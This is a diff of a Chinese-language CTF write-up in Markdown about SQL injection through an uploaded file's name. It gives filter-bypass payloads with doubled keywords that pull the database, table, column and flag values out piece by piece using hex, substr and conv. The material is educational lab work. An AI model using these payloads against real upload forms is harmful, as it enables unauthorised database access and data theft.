@@ -28,21 +28,23 @@
 
 通过回显功能，我们可以将文件名改成
 
+```mysql
 a' +(selselectect conv(substr(hex(database()),1,12),16,10))+ '.jpg
+```
 
 ![image-20210117220936612](\image-1\image-20210117220936612.png)
 
 
 
-本来是select database()便可以得到数据库的名称，但是在这道题中，存在两个问题：
+本来是`select database()`便可以得到数据库的名称，但是在这道题中，存在两个问题：
 
-1.首先，超出一定的长度会出现科学计数法：
+1. 首先，超出一定的长度会出现科学计数法：
 
 ![image-20210117221520355](\image-1\image-20210117221520355.png)
 
 所以需要对得到的数据库名进行substr操作得到子字符串。
 
-2.其次，在使用十六进制的时候，会把出现字母（abcdef）的内容给截掉，所以我们要使用conv函数将十六进制的转化成十进制。
+2. 其次，在使用十六进制的时候，会把出现字母（abcdef）的内容给截掉，所以我们要使用conv函数将十六进制的转化成十进制。
 
 最终通过两个payload得到数据库名：
 
@@ -61,43 +63,49 @@ a' +(selselectect conv(substr(hex(database()),12,15),16,10))+ '.jpg
 
 ![image-20210117222850309](\image-1\image-20210117222850309.png)
 
-7765625f7570
+- 7765625f7570
 
 ![image-20210117222918722](\image-1\image-20210117222918722.png)
 
-6c6f6164
+- 6c6f6164
 
 ![image-20210117223004406](\image-1\image-20210117223004406.png)
 
-所以数据库的名称为web_upload.
+所以数据库的名称为`web_upload`.
 
 接下来依次对表名、列名、字段名进行相同的操作得到flag：
 
 **查询表名**
 
+```mysql
 a'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit  1,1)),1,12),16,10))+'.jpg
 
 a'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit  1,1)),1,12),16,10))+'.jpg
 
  a'+(seleselectct+CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA =  'web_upload' limit 1,1)),25,12),16,10))+'.jpg
+```
 
-按照上述转换操作得到的结果是：hello_flag_is_here
+按照上述转换操作得到的结果是：`hello_flag_is_here	`
 
 **查询列名**
 
-s ‘+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’  limit 0,1)),1,12),16,10))+’.jpg
+```mysql
+s'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’  limit 0,1)),1,12),16,10))+'.jpg
 
-s ‘+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’  limit 0,1)),13,12),16,10))+’.jpg
+s'+(seleselectct+CONV(substr(hex((seselectlect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = ‘hello_flag_is_here’  limit 0,1)),13,12),16,10))+'.jpg
+```
 
-得到的结果是i_am_flag
+得到的结果是`i_am_flag`
 
 **查询字段内容**
 
-s ‘+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+’.jpg
+```mysql
+s'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg
 
-s ‘+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+’.jpg
+s'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg
 
-s ‘+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+’.jpg
+s'+(seleselectct+CONV(substr(hex((selselectect i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+'.jpg
+```
 
-得到的结果是!!_@m_Th.e_F!lag，所以flag就是这个。
+得到的结果是`!!_@m_Th.e_F!lag`，所以flag就是这个。
 
